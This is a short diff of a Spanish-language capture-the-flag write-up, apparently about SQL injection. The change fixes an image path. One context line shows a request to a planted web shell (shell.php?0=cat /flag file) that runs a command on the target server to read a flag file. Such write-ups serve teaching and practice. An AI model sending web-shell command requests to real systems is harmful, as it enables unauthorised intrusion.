@@ -303,6 +303,6 @@ Uno de esos es `flag_876a4c.txt`!!!
 
 Simplemente vamos alla: `https://<IP>:<PORT>/shell.php?0=cat%20/flag_876a4c.txt` y tenemos la respuesta!!!
 
-![respuesta3](imgs/answer3.png)
+![respuesta3](imgs/SQLi/answer3.png)
 
 
